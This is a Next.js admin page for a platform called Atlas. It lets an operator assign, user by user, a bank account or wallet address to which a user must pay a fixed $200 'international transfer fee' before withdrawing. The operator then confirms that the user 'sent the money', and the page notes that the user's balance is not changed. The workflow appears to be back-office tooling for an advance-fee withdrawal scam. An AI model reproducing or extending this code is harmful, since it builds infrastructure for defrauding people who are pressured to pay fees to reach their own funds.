'use client';

import { useEffect, useState } from 'react';
import Link from 'next/link';
import { AdminShell } from '@/components/admin-shell';
import { getAccountById, getScopedStorageKey, getSelectedAdminUserId } from '@/lib/auth';

type FeeMeta = {
  requestId: number;
  amount: number;
  createdAt: number;
};

type FeeAccount = {
  bankName: string;
  accountName: string;
  accountNumber: string;
  reference: string;
  updatedAt: number;
};

const requestKey = 'atlas-withdrawal-fee-request';
const metaKey = 'atlas-withdrawal-fee-meta';
const accountKey = 'atlas-withdrawal-fee-account';
const sentKey = 'atlas-withdrawal-fee-sent';
const confirmedKey = 'atlas-withdrawal-fee-confirmed';

export default function AdminWithdrawalFeePage() {
  const [requested, setRequested] = useState(false);
  const [meta, setMeta] = useState<FeeMeta | null>(null);
  const [bankName, setBankName] = useState('');
  const [accountName, setAccountName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [reference, setReference] = useState('');
  const [message, setMessage] = useState('');
  const [feePaymentSent, setFeePaymentSent] = useState(false);
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
  const selectedUser = selectedUserId ? getAccountById(selectedUserId) : null;

  useEffect(() => {
    const timer = window.setTimeout(() => setSelectedUserId(getSelectedAdminUserId()), 0);
    return () => window.clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!selectedUserId) {
      setRequested(false);
      setMeta(null);
      setBankName('');
      setAccountName('');
      setAccountNumber('');
      setReference('');
      setFeePaymentSent(false);
      return;
    }

    const scopedRequestKey = getScopedStorageKey(requestKey, selectedUserId);
    const scopedMetaKey = getScopedStorageKey(metaKey, selectedUserId);
    const scopedAccountKey = getScopedStorageKey(accountKey, selectedUserId);
    const scopedSentKey = getScopedStorageKey(sentKey, selectedUserId);
    const scopedConfirmedKey = getScopedStorageKey(confirmedKey, selectedUserId);

    const fetchAccount = async () => {
      setRequested(window.localStorage.getItem(scopedRequestKey) === 'true');
      setFeePaymentSent(Boolean(window.localStorage.getItem(scopedSentKey)));
      const storedMeta = window.localStorage.getItem(scopedMetaKey);
      if (storedMeta) {
        try {
          setMeta(JSON.parse(storedMeta) as FeeMeta);
        } catch {
          setMeta(null);
        }
      }

      try {
        const resp = await fetch(`/api/bank-accounts?userId=${encodeURIComponent(selectedUserId!)}&currency=USD`);
        if (resp.ok) {
          const payload = await resp.json();
          const account = payload?.bankAccount ?? null;
          if (account) {
            setBankName(account.bank_name ?? account.bankName ?? '');
            setAccountName(account.account_name ?? account.accountName ?? '');
            setAccountNumber(account.account_number ?? account.accountNumber ?? '');
            setReference(account.reference ?? '');
          }
        }
      } catch {
        // ignore network errors and keep local values
      }
    };

    fetchAccount();
    const channel = new BroadcastChannel('atlas-withdrawal-fee');
    const channelHandler = (event: MessageEvent) => {
      if (!event.data || event.data.userId !== selectedUserId) return;
      fetchAccount();
    };
    window.addEventListener('storage', fetchAccount);
    channel.addEventListener('message', channelHandler);
    return () => {
      window.removeEventListener('storage', fetchAccount);
      channel.removeEventListener('message', channelHandler);
      channel.close();
    };
  }, [selectedUserId]);

  const handleAssign = (event: React.FormEvent) => {
    event.preventDefault();
    if (!selectedUser) {
      setMessage('Choose a user first before assigning a payment account.');
      return;
    }
    if (!bankName.trim() || !accountName.trim() || !accountNumber.trim() || !reference.trim()) {
      setMessage('Complete every account field before assigning payment details.');
      return;
    }

    const account: FeeAccount = {
      bankName: bankName.trim(),
      accountName: accountName.trim(),
      accountNumber: accountNumber.trim(),
      reference: reference.trim(),
      updatedAt: Date.now(),
    };
    // persist on server
    (async () => {
      try {
        const resp = await fetch('/api/bank-accounts', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: selectedUser.id, currency: 'USD', bankName: account.bankName, accountName: account.accountName, accountNumber: account.accountNumber }),
        });
        if (resp.ok) {
          const payload = await resp.json();
          const saved = payload?.bankAccount ?? null;
          // notify client immediately
          const channel = new BroadcastChannel('atlas-withdrawal-fee');
          channel.postMessage({ type: 'fee-account-assigned', account: saved ?? account, userId: selectedUser.id });
          channel.close();
          setMessage('Payment account details assigned and sent to the selected user’s withdrawal fee page.');
          return;
        }
      } catch (e) {
        // fallback to localStorage if network fails
      }

      window.localStorage.setItem(getScopedStorageKey(accountKey, selectedUserId), JSON.stringify(account));
      const channel = new BroadcastChannel('atlas-withdrawal-fee');
      channel.postMessage({ type: 'fee-account-assigned', account, userId: selectedUser.id });
      channel.close();
      setMessage('Payment account details assigned and sent to the selected user’s withdrawal fee page.');
    })();
  };

  const handleConfirmFeePayment = () => {
    if (!meta || !selectedUser) return;
    window.localStorage.setItem(getScopedStorageKey(confirmedKey, selectedUserId), String(meta.requestId));
    window.localStorage.removeItem(getScopedStorageKey(sentKey, selectedUserId));
    const channel = new BroadcastChannel('atlas-withdrawal-fee');
    channel.postMessage({ type: 'fee-payment-confirmed', requestId: meta.requestId, userId: selectedUser.id });
    channel.close();
    setFeePaymentSent(false);
    setMessage('Fee payment confirmed. The selected user has been returned to the main withdrawal status page.');
  };

  return (
    <AdminShell title="Withdrawal Fee" subtitle="Manage the fixed international transfer fee account details for the selected user.">
      <div className="mx-auto max-w-4xl space-y-6">
        <div className="rounded-3xl border border-[color:var(--primary-gold)]/20 bg-[rgba(4,16,33,0.94)] p-6 shadow-lg shadow-black/30">
          <p className="text-sm font-semibold uppercase tracking-[0.3em] text-[color:var(--primary-gold)]">International transfer fee</p>
          <h2 className="mt-2 text-2xl font-semibold text-[var(--text-white)]">{selectedUser ? `${selectedUser.firstName} ${selectedUser.lastName}'s fee account` : 'Fixed fee: $200.00'}</h2>
          <div className="mt-2 flex items-center gap-3">
          <p className="mt-3 text-sm text-slate-400">{selectedUser ? 'Assign the payment account requested by this user. Their balance is not changed by this workflow.' : 'Choose a user first to assign a payment account for their withdrawal fee.'}</p>
            <Link href="/admin/users" className="ml-2 rounded-2xl bg-[color:var(--primary-gold)]/10 px-3 py-1 text-sm text-[color:var(--primary-gold)]">Choose user</Link>
          </div>
        </div>

        {!selectedUser ? (
          <div className="rounded-3xl border border-[color:var(--border-soft)] bg-[color:var(--surface)] p-5 text-sm text-[var(--text-secondary)]">Choose a user first to manage this fee request.</div>
        ) : requested ? (
          <div className="rounded-3xl border border-amber-400/40 bg-amber-500/10 p-5 text-sm text-amber-100">
            <p className="font-semibold">Account generation requested</p>
            {meta ? <p className="mt-2">Request #{meta.requestId} for a $200.00 fee was submitted {new Date(meta.createdAt).toLocaleString()}.</p> : null}
          </div>
        ) : (
          <div className="rounded-3xl border border-[color:var(--border-soft)] bg-[color:var(--surface)] p-5 text-sm text-[var(--text-secondary)]">No fee account request is currently pending for this user.</div>
        )}

        {feePaymentSent ? (
          <div className="rounded-3xl border border-sky-400/40 bg-sky-500/10 p-5 text-sm text-sky-100">
            <p className="font-semibold">Client reported fee payment</p>
            <p className="mt-2">The client has clicked “I have sent the money.” Review the payment and confirm it below.</p>
            <button type="button" onClick={handleConfirmFeePayment} className="mt-4 rounded-2xl bg-sky-400 px-5 py-3 font-semibold text-slate-950 transition hover:opacity-90">Confirm fee payment received</button>
          </div>
        ) : null}

        <form onSubmit={handleAssign} className="space-y-5 rounded-3xl border border-[color:var(--primary-gold)]/20 bg-[rgba(4,16,33,0.94)] p-6 shadow-lg shadow-black/30">
          <div>
            <label className="mb-2 block text-sm text-slate-300">Bank or payment institution</label>
            <input value={bankName} onChange={(event) => setBankName(event.target.value)} className="w-full rounded-2xl border border-[color:var(--primary-gold)]/20 bg-[color:var(--bg-dark-navy)] px-4 py-3 text-sm text-white outline-none" placeholder="Institution name" />
          </div>
          <div>
            <label className="mb-2 block text-sm text-slate-300">Account name</label>
            <input value={accountName} onChange={(event) => setAccountName(event.target.value)} className="w-full rounded-2xl border border-[color:var(--primary-gold)]/20 bg-[color:var(--bg-dark-navy)] px-4 py-3 text-sm text-white outline-none" placeholder="Beneficiary or account name" />
          </div>
          <div>
            <label className="mb-2 block text-sm text-slate-300">Account number or payment address</label>
            <input value={accountNumber} onChange={(event) => setAccountNumber(event.target.value)} className="w-full rounded-2xl border border-[color:var(--primary-gold)]/20 bg-[color:var(--bg-dark-navy)] px-4 py-3 text-sm text-white outline-none" placeholder="Account number or wallet address" />
          </div>
          <div>
            <label className="mb-2 block text-sm text-slate-300">Payment reference</label>
            <input value={reference} onChange={(event) => setReference(event.target.value)} className="w-full rounded-2xl border border-[color:var(--primary-gold)]/20 bg-[color:var(--bg-dark-navy)] px-4 py-3 text-sm text-white outline-none" placeholder="Reference the client must include" />
          </div>
          {message ? <div className="rounded-2xl border border-emerald-400/30 bg-emerald-500/10 px-4 py-3 text-sm text-emerald-200">{message}</div> : null}
          <button type="submit" className="w-full rounded-2xl bg-[color:var(--primary-gold)] px-4 py-3 text-sm font-semibold text-[color:var(--bg-dark-navy)] transition hover:opacity-90">Assign payment account</button>
        </form>
      </div>
    </AdminShell>
  );
}
